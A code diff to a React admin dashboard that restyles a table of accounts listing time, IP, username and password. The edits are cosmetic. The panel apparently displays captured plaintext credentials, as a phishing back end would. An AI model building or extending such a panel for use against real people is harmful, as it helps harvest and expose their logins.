@@ -1,6 +1,7 @@
 import React, { Component, Fragment } from 'react';
 import PropTypes from 'prop-types';
 import dayjs from 'dayjs';
+import withStyles from '@material-ui/core/styles/withStyles';
 
 import Navbar from '../layout/Navbar';
 
@@ -31,6 +32,21 @@ import { logoutAdmin } from '../redux/actions/authActions';
 import { connect } from 'react-redux';
 import { deleteAccount, getAccounts } from '../redux/actions/accountActions';
 import IconButton from '@material-ui/core/IconButton';
+
+const styles = (theme) => ({
+	...theme.globalStyles,
+	table: {
+		'&:nth-of-type(even)': {
+		  backgroundColor: theme.palette.action.hover,
+		}
+	},
+	tableRow: {
+		backgroundColor: theme.palette.primary.light
+	},
+	tableCell: {
+		color: theme.palette.primary.contrastText
+	}
+});
 
 class AdminDash extends Component {
 	state = {
@@ -68,6 +84,7 @@ class AdminDash extends Component {
 
 	render() {
 		const {
+			classes,
 			accounts: { loading },
 			UI: { errors }
 		} = this.props;
@@ -127,14 +144,14 @@ class AdminDash extends Component {
 								<TableContainer component={Paper}>
 									<Table style={{ width: '100%' }} aria-label='Accounts'>
 										<TableHead>
-											<TableRow>
-												<TableCell>Time</TableCell>
-												<TableCell align='center'>IP</TableCell>
-												<TableCell align='center'>Username</TableCell>
-												<TableCell align='center'>Password</TableCell>
+											<TableRow className={classes.tableRow}>
+												<TableCell className={classes.tableCell}>Time</TableCell>
+												<TableCell className={classes.tableCell} align='center'>IP</TableCell>
+												<TableCell className={classes.tableCell} align='center'>Username</TableCell>
+												<TableCell className={classes.tableCell} align='center'>Password</TableCell>
 											</TableRow>
 										</TableHead>
-										<TableBody>
+										<TableBody className={classes.table}>
 											{this.state.accounts.map((account) => (
 												<TableRow key={account._id}>
 													<TableCell
@@ -166,7 +183,9 @@ class AdminDash extends Component {
 							)}
 						</CardContent>
 					)}
-					Last Updated <TimeAgo date={this.state.lastUpdate} />
+					<Typography style={{ marginBottom: 5 }} variant="body2">
+						Last Updated <TimeAgo date={this.state.lastUpdate} />
+					</Typography>
 				</Card>
 			</Fragment>
 		);
@@ -192,4 +211,4 @@ const mapActionsToProps = {
 	logoutAdmin
 };
 
-export default connect(mapStateToProps, mapActionsToProps)(AdminDash);
+export default connect(mapStateToProps, mapActionsToProps)(withStyles(styles)(AdminDash));
